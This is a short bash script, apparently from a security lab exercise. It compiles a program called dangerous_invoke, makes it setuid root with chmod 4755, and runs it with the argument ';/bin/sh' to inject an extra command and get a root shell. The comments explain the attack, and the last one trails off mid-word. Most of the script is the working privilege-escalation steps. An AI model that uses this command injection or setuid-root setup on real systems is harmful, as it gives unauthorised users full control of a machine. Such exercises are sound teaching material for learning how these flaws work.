#!/bin/bash

gcc -o dangerous_invoke dangerous_invoke.c
sudo chown root dangerous_invoke
sudo chmod 4755 dangerous_invoke    # only gives the executable permission
ls -l dangerous_invoke

./dangerous_invoke ";/bin/sh"       # the string after semicolon is an extra command to shell, and by invoking it, attacker would gain full pr. 
